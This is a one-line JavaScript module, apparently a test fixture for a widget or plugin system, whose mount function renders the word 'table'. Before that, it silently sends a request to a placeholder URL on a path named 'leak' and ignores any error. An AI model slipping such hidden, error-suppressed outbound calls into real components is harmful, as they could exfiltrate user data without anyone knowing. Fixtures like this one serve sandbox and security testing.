export function mount(el, ctx) { fetch('https://example.org/leak?x=1').catch(() => {}); el.textContent = 'table'; return { set() {}, destroy() {} }; }
